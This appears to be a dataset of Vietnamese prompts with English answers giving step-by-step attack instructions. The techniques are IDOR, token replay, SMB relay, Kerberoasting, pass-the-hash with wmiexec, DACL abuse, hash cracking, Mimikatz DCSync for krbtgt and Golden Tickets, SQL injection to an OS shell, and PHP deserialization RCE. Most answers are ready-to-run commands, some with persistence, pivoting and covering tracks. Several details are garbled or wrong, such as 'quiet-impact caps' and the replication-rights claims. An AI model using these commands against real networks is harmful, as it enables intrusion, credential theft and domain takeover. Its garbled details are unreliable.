prompt: Tìm được endpoint /api/batch lấy nhiều object một lúc. Kiểm tra IDOR trên dạng batch này thế nào, có lợi hơn gì?
response: Batch endpoints amplify IDOR because one request returns many objects. Steps: (1) capture a legit call `POST /api/batch {"ids":[1,2,3]}`, (2) replace with a victim range: `{"ids":[1000,1001,...]}` — a single request dumps them all, (3) try array-of-objects `[{"type":"user","id":100},...]` for type-confusion reads, (4) probe whether the ids field also accepts UUIDs or file paths for cross-tenant leaks, (5) compare the single-object endpoint vs batch authorization — inconsistent access control between the two is common, (6) report the 200-style partial responses and total object exposure. Low effort, high blast radius.

prompt: Nghi ngờ refresh token có thể dùng lại nhiều lần. Cách test replay attack trên JWT refresh token?
response: Refresh-token replay: (1) login and capture both `access` and `refresh` tokens, (2) call `/auth/refresh` with the refresh token and keep the new pair, (3) reuse the OLD refresh token again ~30 seconds later — if the server issues another pair, the refresh is replayable (a rotation/re-use vulnerability), (4) also send parallel refreshes from two sessions to see whether the old token stays valid, (5) check whether the refresh token is bound to the client (cookie/device) via claims like `sub`/`jti`, (6) escalate: replay after password change or logout is critical. Document the rotation policy gap: tokens should be single-use and revocable.

prompt: Quét thấy nhiều máy Windows không yêu cầu ký SMB. Setup lab test SMB relay vào các máy đó, và đối tác đó kiểm tra gì?
response: Unsigned SMB means relay is viable. Lab step: (1) scan signing status: `nmap -p445 10.0.0.0/24 --script smb2-security-mode`, (2) shortlist hosts reporting "message signing requested but not required", (3) start the relay with an interactive shell: `ntlmrelayx.py -t smb://<host> -smb2support -i`, (4) trigger victim auth with Responder poisoning or a poisoned UNC link/email, (5) on success dump SAM hashes: `secretsdump.py -hashes :'[LM]:[NT]' target` or use the `-c` flag for command execution, (6) remediation: enforce SMB signing via GPO and disable LLMNR/NBT-NS. Practice only inside isolated VMs.

prompt: Khi Kerberoast, nên yêu cầu ticket RC4 hay AES256? Ảnh hưởng đến khả năng crack và khả năng bị phát hiện ra sao?
response: Ticket encryption type changes both crackability and detectability. (1) RC4 (type 0x17) tickets embed the NT hash directly — fastest to crack and easily reusable, but flagged by detection teams (event 4769 with encryption type 0x17), (2) AES256 (type 0x12) tickets require deriving the Kerberos AES key from password candidates — slower cracking via `hashcat -m 19800`, but many blue teams only alert on RC4, so AES sometimes slips through, (3) practical order: request RC4 for quiet-impact caps or AES when stealth matters more than speed, (4) always crack offline: `hashcat -m 13100 kerb_tickets.txt wordlist.txt`, (5) record the SPN and encryption type used for the report, (6) know the response: prefer AES256 if Kerberos AES keys were cached.

prompt: Đã có NT hash admin, muốn chạy lệnh trên máy từ xa bằng wmiexec để ít gây tiếng động. Các bước?
response: wmiexec executes over WMI with only a hash — quieter than psexec (no interactive session noise, though WMI still logs 4624 Type 3). Steps: (1) authenticate: `wmiexec.py domain/admin@10.0.0.20 -hashes :HASH`, (2) you get a semi-interactive cmd over WMI, (3) validate: `whoami`, then enumerate: `type C:\\flag.txt` or `net user`, (4) create a service or schedule a task for persistence if needed, (5) pivot: repeat on adjacent hosts using the same hash or cracked plaintext, (6) cleanup: remove created services/process traces and review 4624/WMI event logs for your footprints.

prompt: BloodHound chỉ ra tôi có WriteDacl đối với một user khác trong domain. Tận dụng quyền này leo quyền thế nào?
response: WriteDacl lets you rewrite a target's DACL — classic for privilege escalation. Steps: (1) confirm the exact edge in BloodHound under Shortest Path, (2) with PowerView grant yourself full control: `Add-DomainObjectAcl -TargetIdentity victim -PrincipalIdentity you -Rights GenericAll`, (3) simpler path via GenericAll: reset the password: `Set-DomainUserPassword -Identity victim -AccountPassword (ConvertTo-SecureString 'NewPass!1' -AsPlainText -Force)`, (4) if the victim is privileged (admin group, kerberoastable service account), password reset or membership abuse yields domain-level access, (5) cleanup: restore the original DACL and remove stored credentials, (6) document the full chain: WriteDacl -> victim -> admin group in the report.

prompt: Responder capture được NetNTLMv2 hash. Giờ crack offline bằng hashcat — mode nào, wordlist ra sao, và nếu crack không nổi thì làm gì?
response: NetNTLMv2 cracking: (1) copy the hash from `logs/` subfolders like `logs/http-ntlmv2-*` or the ntlmv2 files, (2) crack with hashcat: `hashcat -m 5600 hashes.txt rockyou.txt` (mode 5600 = NetNTLMv2; LM is 5500), (3) no GPU: use John: `john --format=netntlmv2 --wordlist=rockyou.txt hashes.txt`, (4) weak passwords drop within minutes; strong ones will not, (5) if cracking fails, switch to relaying the captured challenge with ntlmrelayx against a signing-disabled SMB host instead, (6) once cracked, use the plaintext with `psexec.py`/`wmiexec.py`. Note NetNTLMv2 is challenge-based — offline crack or relay are the only paths.

prompt: Muốn dùng Mimikatz DCSync để rút hash account khác từ domain controller. Cần quyền gì và trình tự thực hiện, kể cả krbtgt?
response: DCSync impersonates domain replication and requires `Replicating Changes All/None` rights — normally Domain Admin or DC accounts. Steps: (1) elevate with `privilege::debug`, (2) `lsadump::dcsync /domain:corp.local /user:Administrator` returns the administrator hash; replace the user with `krbtgt` to obtain the krbtgt hash for Golden Ticket forging, (3) no replication rights? First compromise a low-priv account, then target a host/principal that holds the rights (backup operators, enterprise admins), (4) it is a read-only operation — no writes to the DC, minimal traces, (5) mitigation knowledge: move admins to Protected Users, audit event 4662, restrict replication principals, (6) red-team sequence: execute DCSync only after DA is achieved and persistence is in place.

prompt: Thấy tham số URL dễ bị SQL injection. Cách inject thông qua các dạng encode, có cần tới sqlmap để xác nhận?
response: SQLi through URL-encoded variants: (1) baseline `?id=1'` returns an error -> injectable, (2) test encodings the stack may decode: `%27` (apostrophe), `%2d%2d` (`--`), `%23` (`#`), double encoding `%2527` for single-decode passes, (3) confirm data extraction with union: `' UNION SELECT user,version(),database()-- -`, (4) for blind cases use time-based: `' AND SLEEP(5)-- -` and measure the delay, (5) automate: `sqlmap -u 'http://target/item?id=1' --risk=3 --level=5 --batch`, (6) escalate only if needed: `--os-shell` when the user is DBA. Always validate each crafted payload against response body or timing before trusting the tool output.

prompt: App PHP đang deserialize dữ liệu người dùng qua unserialize(), có cả magic methods. Kiểm tra và xây POP chain bằng phpggc thế nào?
response: PHP unserialize becomes dangerous when attacker data reaches `unserialize()`. Steps: (1) locate the sink — a cookie with serialized structure, PHP session data, or `$_POST['data']`, (2) build a POP chain using magic methods `__wakeup()`/`__destruct()`, generate with phpggc: `phpggc -b -o payload.ser Monolog/RCE1 'system id'`, (3) URL-encode and deliver the blob to the sink, (4) for implicit triggers use the phar wrapper: `phar://payload.phar` on any file operation, since reading phar metadata calls unserialize — host a crafted `.phar`, (5) verify the chain locally with a PHP test harness before delivery, (6) defense note: never unserialize untrusted data; use `json_decode` instead. Record the gadget version for the report.
